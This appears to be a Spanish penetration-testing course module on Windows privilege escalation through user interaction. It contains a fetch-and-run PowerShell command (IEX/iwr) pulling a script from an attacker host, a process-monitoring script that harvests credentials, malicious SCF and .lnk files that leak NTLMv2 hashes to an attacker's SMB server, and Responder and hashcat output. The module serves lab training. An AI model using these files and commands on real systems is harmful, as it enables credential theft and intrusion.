Los usuarios a veces son el eslabón más débil en una organización. Un empleado sobrecargado de trabajo puede no notar algo extraño en su máquina cuando navega por una unidad compartida, hace clic en un enlace o ejecuta un archivo. Como se ha discutido a lo largo de este módulo, Windows nos presenta una enorme superficie de ataque, y hay muchas cosas que revisar al enumerar vectores de escalación de privilegios locales. Una vez que hayamos agotado todas las opciones, podemos mirar técnicas específicas para robar credenciales de un usuario desprevenido capturando su tráfico de red/comandos locales o atacando un servicio vulnerable conocido que requiera interacción del usuario. Una de mis técnicas favoritas es colocar archivos maliciosos alrededor de compartidos de archivos muy accedidos en un intento de recuperar hashes de contraseñas de usuarios para romperlos offline más tarde.

---

## Traffic Capture

Si `Wireshark` está instalado, los usuarios sin privilegios pueden capturar tráfico de red, ya que la opción para restringir el acceso al controlador Npcap solo a los Administradores no está habilitada por defecto.

![image](https://academy.hackthebox.com/storage/modules/67/pcap.png)

Aquí podemos ver un ejemplo aproximado de la captura de credenciales FTP en texto claro ingresadas por otro usuario mientras está conectado en la misma máquina. Aunque no es muy probable, si `Wireshark` está instalado en una máquina en la que nos encontramos, vale la pena intentar una captura de tráfico para ver qué podemos captar.

![image](https://academy.hackthebox.com/storage/modules/67/ftp.png)

Además, supongamos que nuestro cliente nos posiciona en una máquina de ataque dentro del entorno. En ese caso, vale la pena ejecutar `tcpdump` o `Wireshark` durante un tiempo para ver qué tipos de tráfico se están pasando por el cable y si podemos ver algo interesante. La herramienta [net-creds](https://github.com/DanMcInerney/net-creds) se puede ejecutar desde nuestra máquina de ataque para capturar contraseñas y hashes de una interfaz en vivo o de un archivo pcap. Vale la pena dejar que esta herramienta se ejecute en segundo plano durante una evaluación o ejecutarla contra un pcap para ver si podemos extraer alguna credencial útil para la escalación de privilegios o el movimiento lateral.

---

## Process Command Lines

### Monitoring for Process Command Lines

Cuando obtenemos un shell como usuario, puede haber tareas programadas u otros procesos que se ejecuten y que pasen credenciales en la línea de comandos. Podemos buscar líneas de comandos de procesos usando algo como el siguiente script. Captura líneas de comandos de procesos cada dos segundos y compara el estado actual con el estado anterior, mostrando cualquier diferencia.

```r
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

### Running Monitor Script on Target Host

Podemos alojar el script en nuestra máquina de ataque y ejecutarlo en el host objetivo de la siguiente manera.

```r
PS C:\htb> IEX (iwr 'http://10.10.10.205/procmon.ps1') 

InputObject                                           SideIndicator
-----------                                           -------------
@{CommandLine=C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}} =>      
@{CommandLine=“C:\Windows\system32\cmd.exe” }                          =>      
@{CommandLine=\??\C:\Windows\system32\conhost.exe 0x4}                      =>      
@{CommandLine=net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd}       =>       
@{CommandLine=“C:\Windows\system32\backgroundTaskHost.exe” -ServerName:CortanaUI.AppXy7vb4pc2... <=
```

Esto es exitoso y revela la contraseña del usuario de dominio `sqlsvc`, que luego podríamos usar para obtener acceso al host SQL02 o posiblemente encontrar datos sensibles como credenciales de bases de datos en el compartido `backups`.

---

## Vulnerable Services

También podemos encontrarnos en situaciones donde caemos en un host que ejecuta una aplicación vulnerable que se puede utilizar para elevar privilegios mediante la interacción del usuario. [CVE-2019–15752](https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e) es un gran ejemplo de esto. Esta era una vulnerabilidad en Docker Desktop Community Edition antes de la versión 2.1.0.1. Cuando esta versión en particular de Docker se inicia, busca varios archivos diferentes, incluyendo `docker-credential-wincred.exe`, `docker-credential-wincred.bat`, etc., que no existen con una instalación de Docker. El programa busca estos archivos en `C:\PROGRAMDATA\DockerDesktop\version-bin\`. Este directorio estaba mal configurado para permitir acceso de escritura completo al grupo `BUILTIN\Users`, lo que significa que cualquier usuario autenticado en el sistema podría escribir un archivo en él (como un ejecutable malicioso).

Cualquier ejecutable colocado en ese directorio se ejecutaría cuando a) la aplicación Docker se inicie y b) cuando un usuario se autentique usando el comando `docker login`. Aunque un poco más antiguo, no está fuera del ámbito de posibilidad encontrarse con una estación de trabajo de un desarrollador que ejecute esta versión de Docker Desktop, de ahí la importancia de enumerar a fondo el software instalado. Aunque esta falla en particular no nos garantizaría acceso elevado (ya que depende de un reinicio del servicio o la acción del usuario), podríamos plantar nuestro ejecutable durante una evaluación a largo plazo y verificar periódicamente si se ejecuta y nuestros privilegios se elevan.

---

## SCF on a File Share

Un Shell Command File (SCF) es usado por Windows Explorer para moverse arriba y abajo en los directorios, mostrar el escritorio, etc. Un archivo SCF puede ser manipulado para que la ubicación del archivo de íconos apunte a una ruta UNC específica y hacer que Windows Explorer inicie una sesión SMB cuando se accede a la carpeta donde reside el archivo .scf. Si cambiamos el IconFile a un servidor SMB que controlamos y ejecutamos una herramienta como [Responder](https://github.com/lgandx/Responder), [Inveigh](https://github.com/Kevin-Robertson/Inveigh) o [InveighZero](https://github.com/Kevin-Robertson/InveighZero), a menudo podemos capturar hashes de contraseñas NTLMv2 para cualquier usuario que navegue por el compartido. Esto puede ser particularmente útil si obtenemos acceso de escritura a un compartido de archivos que parece ser muy utilizado o incluso a un directorio en la estación de trabajo de un usuario. Podríamos capturar el hash de la contraseña de un usuario y usar la contraseña en texto claro para escalar privilegios en el host objetivo, dentro del dominio, o ampliar nuestro acceso/obtener acceso a otros recursos.

### Malicious SCF File

En este ejemplo, crearemos el siguiente archivo y lo nombraremos algo así como `@Inventory.scf` (similar a otro archivo en el directorio, para que no parezca fuera de lugar). Ponemos un `@` al inicio del nombre del archivo para que aparezca en la parte superior del directorio y sea visto y ejecutado por Windows Explorer tan pronto como el usuario acceda al compartido. Aquí ponemos nuestra dirección IP `tun0` y cualquier nombre de compartido y nombre de archivo .ico falsos.

```r
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

### Starting Responder

A continuación, iniciamos Responder en nuestra máquina de ataque y esperamos a que el usuario navegue por el compartido. Si todo va según lo planeado, veremos el hash de la contraseña NTLMv2 del usuario en nuestra consola e intentaremos descifrarlo offline.

```r
sudo responder -wrf -v -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.2.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [ON]

[+] Generic Options:
    Responder NIC              [tun2]
    Responder IP               [10.10.14.3]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']



[!] Error starting SSL server on port 443, check permissions or other servers running.
[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.129.43.30
[SMB] NTLMv2-SSP Username : WINLPE-SRV01\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>...
```

### Cracking NTLMv2 Hash with Hashcat

Luego podríamos intentar descifrar este hash de contraseña offline usando `Hashcat` para recuperar el texto claro.

```r
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

ADMINISTRATOR::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>...:Welcome1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: ADMINISTRATOR::WINLPE-SRV01:815c504e7b06ebda:afb6d3...000000
Time.Started.....: Thu May 27 19:16:18 2021 (1 sec)
Time.Estimated...: Thu May 27 19:16:19 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1233.7 kH/s (2.74ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 43008/14344385 (0.30%)
Rejected.........: 0/43008 (0.00%)
Restore.Point....: 36864/14344385 (0.26%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: holabebe -> harder

Started: Thu May 27 19:16:16 2021
Stopped: Thu May 27 19:16:20 2021
```

Nota: En nuestro ejemplo, espera de 2 a 5 minutos para que el "usuario" navegue por el compartido después de iniciar Responder.

---

## Capturing Hashes with a Malicious .lnk File

El uso de SCFs ya no funciona en hosts Server 2019, pero podemos lograr el mismo efecto usando un archivo `.lnk` malicioso. Podemos usar varias herramientas para generar un archivo .lnk malicioso, como [Lnkbomb](https://github.com/dievus/lnkbomb), ya que no es tan sencillo como crear un archivo .scf malicioso. También podemos crear uno usando unas pocas líneas de PowerShell:

### Generating a Malicious .lnk File

```r

$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

Prueba esta técnica en el host objetivo para familiarizarte con la metodología y agregar otra táctica a tu arsenal para cuando encuentres entornos donde Server 2019 sea prevalente.